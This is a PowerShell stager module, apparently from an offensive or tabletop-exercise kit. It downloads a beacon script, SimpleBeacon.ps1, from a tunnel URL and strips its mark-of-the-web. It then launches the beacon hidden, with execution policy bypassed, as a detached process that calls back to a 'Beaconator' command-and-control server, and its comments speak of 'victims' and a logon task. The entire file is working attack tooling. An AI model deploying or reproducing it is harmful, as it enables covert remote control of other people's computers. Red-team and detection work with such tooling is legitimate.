# ttx/rmm/simplebeacon/install.ps1 - Beaconator C2 beacon (SimpleBeacon.ps1)
# Dot-sourced by rmm.ps1 (the tool-agnostic loader): $Base, $BeaconUrl, $Log
# and the Beacon() function are already in scope when this runs.
#
# Downloads SimpleBeacon.ps1, then launches it HIDDEN as a detached process
# pointed at your Beaconator C2 listener. No wizard, no install - the machine
# simply shows up in your Beaconator console and checks in every $C2Interval
# seconds.
#
# IMPORTANT: the beacon checks in DIRECTLY over TCP to $C2Server:$C2Port -
# it does NOT tunnel back through the Cloudflare quick tunnel. The tunnel is
# only used for the one-time payload download ($Url below). Set $C2Server to
# whatever IP/hostname your victims can reach your Beaconator listener on.

$Url   = "$Base/rmm/simplebeacon/SimpleBeacon.ps1"
$File  = "$env:PUBLIC\SimpleBeacon.ps1"
$Desc  = 'Beaconator C2 beacon (PowerShell)'

# Beaconator C2 settings - EDIT THESE per deployment:
#   C2Server  : IP or hostname of your Beaconator listener - the beacon
#               connects to it DIRECTLY (plain TCP), not via the quick tunnel
#   C2Port    : TCP port the listener answers on (default 5074)
#   C2Encoding: plaintext | base64 - must match the server setting
#               (Beaconator's default, and this module's default, is plaintext)
#   C2Interval: seconds between beacon check-ins
$C2Server   = 'CHANGE THIS TO YOUR BEACONATOR SERVER IP'
$C2Port     = 5074
$C2Encoding = 'plaintext'
$C2Interval = 15

# Is a beacon process alive? (hidden powershell running SimpleBeacon.ps1)
function Test-BeaconRunning {
  Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" -ErrorAction SilentlyContinue |
    Where-Object { $_.CommandLine -like '*SimpleBeacon.ps1*' }
}

# Refuse to launch at the placeholder value - a beacon pointed at nothing
# registers nowhere and the operator sees nothing in the Beaconator console.
if (-not $C2Server -or $C2Server -like '*CHANGE THIS*') {
  Beacon 'simplebeacon-unconfigured'
  Add-Content $Log "$(Get-Date -f s)  ERROR: set `$C2Server in ttx/rmm/simplebeacon/install.ps1"
  return
}

# Already running (e.g. a reused victim, or re-run from the logon task)?
# Skip - it is already checking in; nothing to install.
if (Test-BeaconRunning) {
  Add-Content $Log "$(Get-Date -f s)  beacon already running - skipping launch"
  Beacon 'simplebeacon-already-running'
  return
}

# Download if not present + clear MOTW
if (-not (Test-Path $File)) {
  Invoke-WebRequest -Uri $Url -OutFile $File -UseBasicParsing
  Add-Content $Log "$(Get-Date -f s)  downloaded $Url"
}
Unblock-File $File

if (-not (Test-Path $File)) {
  Beacon 'simplebeacon-download-failed'
  Add-Content $Log "$(Get-Date -f s)  ERROR: downloaded payload missing"
  return
}

# LAUNCH - hidden and DETACHED: the beacon loops forever, so rmm.ps1 must
# not wait on it (the loader has to return so stage1's task finishes cleanly).
# The server/port/encoding/interval are passed as parameters, so the payload
# file itself needs no editing.
Beacon 'simplebeacon-launch'
$BArgs = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$File`" -Server $C2Server -Port $C2Port -Encoding $C2Encoding -Interval $C2Interval"
Start-Process powershell.exe -ArgumentList $BArgs -WindowStyle Hidden
Add-Content $Log "$(Get-Date -f s)  launched $Desc hidden -> ${C2Server}:$C2Port ($C2Encoding, ${C2Interval}s interval)"

# Poll for the beacon process to confirm it survived launch. Note the beacon
# itself registers with the C2 server - watch the Beaconator console from
# here on; these beacons only confirm the process is alive.
$Running = $false
for ($i = 0; $i -lt 12; $i++) {
  Start-Sleep -Seconds 5
  if (Test-BeaconRunning) { $Running = $true; break }
}
if ($Running) {
  Beacon 'simplebeacon-running'
  Add-Content $Log "$(Get-Date -f s)  beacon process alive - watch the Beaconator console"
} else {
  Beacon 'simplebeacon-notready'
  Add-Content $Log "$(Get-Date -f s)  beacon process did not stay up within 1 min"
}
